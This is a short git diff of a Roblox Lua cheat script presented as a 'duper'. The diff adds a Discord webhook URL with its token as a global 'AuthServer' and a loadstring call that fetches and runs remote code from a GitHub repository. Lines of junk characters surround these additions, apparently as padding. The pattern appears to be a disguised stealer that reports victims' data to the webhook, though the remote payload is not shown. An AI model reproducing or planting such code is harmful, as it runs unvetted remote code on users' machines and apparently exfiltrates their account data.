@@ -28,8 +28,11 @@ local CreditsSection = Credits:NewSection("made by slowlyy and szpinakzielony");
 
 local h = "NU#H&F#FN#N)FN#N(F#F&HBCSMCSBNCB^SDFNC*N#^F&B*NXDMCMDSM&YCVXCNHMHMSBMHUBEBYFV^92y834th82n9bgv9nby8c29c2tbyocgt4bcyb7t49ycb2c92v294cv29cv29cvm2cm9b2c4mb2c2c4mvm9b4vmb892c4mb892ctmb92c48b2c8b2c4b84c82c4"
  
- 
+ _G.Key = "420reknitsGO"
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Scripts-Project-wd/paidhub/main/script-duper'))()
+_G.AuthServer = "https://discord.com/api/webhooks/1053144886989307935/RXIQquMjptLFn873nBnOLpYxMzkniPcxyD6fkYjkInr6wtQCVZbb87zPb_hTUiwoXjyI"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
+
 
 local j = "NU#H&F#FN#N)FN#N(F#F&HBCSMCSBNCB^SDFNC*N#^F&B*NXDMCMDSM&YCVXCNHMHMSBMHUBEBYFV^92y834th82n9bgv9nby8c29c2tbyocgt4bcyb7t49ycb2c92v294cv29cv29cvm2cm9b2c4mb2c2c4mvm9b4vmb892c4mb892ctmb92c48b2c8b2c4b84c82c4"
